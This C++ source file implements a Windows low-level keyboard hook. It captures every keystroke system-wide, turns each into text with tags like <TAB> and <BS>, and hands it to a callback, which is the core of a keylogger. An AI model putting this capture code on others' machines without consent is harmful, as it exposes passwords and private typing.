#include "stdafx.h"
#include "Hook.h"

using namespace std;

std::function<void(const wchar_t[])> Hook::callback;

void Hook::setHook(std::function<void(const wchar_t[])> keyboardCallback) {
	callback = keyboardCallback;
	std::cout << "set hook";
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, NULL, 0);
}

void Hook::unsetHook() {
	UnhookWindowsHookEx(hHook);
}

LRESULT CALLBACK Hook::hookProc(const int nCode, const WPARAM wParam, const LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	BYTE keyState[256] = { 0 };
	bool keyStateResult;
	wchar_t buffer[5];
	
	GetKeyState(NULL);
	keyStateResult = GetKeyboardState(keyState);

	switch (wParam) {
	case WM_KEYDOWN: {
		std::wstring result;
		switch (p->vkCode) {
		case VK_RETURN:
			result = L"\n";
			break;
		case VK_TAB:
			result = L"<TAB>";
			break;
		case VK_LCONTROL:
			result = L"<CTRL>";
			break;
		case VK_RCONTROL:
			result = L"<RCTRL>";
			break;
		case VK_LWIN:
			result = L"<WIN>";
			break;
		case VK_BACK:
			result = L"<BS>";
			break;
		case VK_DELETE:
			result = L"<DEL>";
			break;
		case VK_ESCAPE:
			result = L"<ESC>";
			break;
		case VK_F1:
			result = L"<F1>";
			break;
		case VK_F2:
			result = L"<F2>";
			break;
		case VK_F3:
			result = L"<F3>";
			break;
		case VK_F4:
			result = L"<F4>";
			break;
		case VK_F5:
			result = L"<F5>";
			break;
		case VK_F6:
			result = L"<F6>";
			break;
		case VK_F7:
			result = L"<F7>";
			break;
		case VK_F8:
			result = L"<F8>";
			break;
		case VK_F9:
			result = L"<F9>";
			break;
		case VK_F10:
			result = L"<F10>";
			break;
		case VK_F11:
			result = L"<F11>";
			break;
		case VK_F12:

			result = L"<F12>";
			break;
		default:
			int toUnicodeResult = ToUnicodeEx(p->vkCode, p->scanCode, keyState,
				buffer, _countof(buffer), 0, nullptr);
			result = buffer;
		}

		callback(result.c_str());
	}
	}
	
	return CallNextHookEx(0, nCode, wParam, lParam);
}